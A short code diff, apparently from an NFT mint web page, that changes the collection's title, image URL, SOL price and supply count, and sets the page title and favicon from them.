@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0
-const image = 'https://pbs.twimg.com/media/Fbz12saaIAESd2o?format=jpg&name=medium'
-const Title = 'Cursed Oiran'
-const supply = 6666
+const solAmount = 2
+const image = 'https://media.discordapp.net/attachments/1004361675375390720/1020371919234674769/unknown.png?width=588&height=590'
+const Title = 'Adopted Gorillas Club'
+const supply = 4782
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
